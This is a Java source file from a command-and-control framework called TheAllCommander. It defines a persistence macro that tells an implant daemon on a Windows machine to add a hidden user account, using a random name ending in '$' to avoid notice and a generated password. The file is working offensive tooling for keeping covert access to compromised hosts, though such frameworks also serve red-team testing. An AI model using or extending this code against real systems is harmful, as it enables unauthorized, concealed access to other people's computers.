package c2.session.macro.persistence;

import java.security.SecureRandom;
import java.util.Random;

import c2.session.macro.AbstractCommandMacro;
import c2.session.macro.MacroOutcome;

public class WindowsHiddenUserMacro extends AbstractCommandMacro {

	private Random rnd = new SecureRandom();
	
	public static String COMMAND = "add_hidden_user";
	
	public static String INVALID_CMD_MSG = "Warning: Proceeding with a username that doesn't include '$' character";
	public static String INVALID_INPUT_MSG ="Cannot process macro, invalid invocation.";
	
	public static String HELP = COMMAND + " <optional - name of user to add> <optional - password to use. One argument assumes password requested>";
	
	@Override
	public String getReadableName() {
		return "Windows Hidden User Macro";
	}

	@Override
	public String getInvocationCommandDescription() {
		return HELP;
	}

	@Override
	public String getBehaviorDescription() {
		return "This macro instructs TheAllCommander daemon to create a hidden user." + System.lineSeparator() + "Inspired by: https://github.com/Ben0xA/DoUCMe";
	}

	@Override
	public boolean isCommandMatch(String cmd) {
		return cmd.startsWith(COMMAND);
	}

	private String generateRandomString() {
		int leftLimit = 97; // letter 'a'
	    int rightLimit = 122; // letter 'z'
	    int targetStringLength = 3 + rnd.nextInt(10);

	    return rnd.ints(leftLimit, rightLimit + 1)
	  	      .limit(targetStringLength)
		      .collect(StringBuilder::new, StringBuilder::appendCodePoint, StringBuilder::append)
		      .toString();
	}
	
	@Override
	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
		MacroOutcome outcome = new MacroOutcome();
		String username = generateRandomString() + "$";
		String password = generateRandomString() + "A#$%";
		String elements[] = cmd.split(" ");
		//User has only specified a password
		if(elements.length == 2) {
			password = elements[1];
		}
		//User has specified a username and password
		else if (elements.length == 3){
			username = elements[1];
			password= elements[2];
			if(!username.contains("$")) {
				outcome.addMacroMessage(INVALID_CMD_MSG);
			}
		}
		//Else invalid entirely
		else if (elements.length > 3){
			outcome.addError(INVALID_INPUT_MSG);
			return outcome;
		}
		String thisCommand = COMMAND + " " + username + " " + password;
		sendCommand(thisCommand, sessionId, outcome);
		String response = awaitResponse(sessionId, outcome);
		response = response.replace("\r", "");
		response = response.replace("\n", "");
		if(response.equals("SUCCESS")) {
			outcome.addMacroMessage("Successfully added user: '" + username + "' with password: '" + password + "'");
		}else {
			outcome.addError("Unable to add user: " + response);
		}
		return outcome;
	}

}
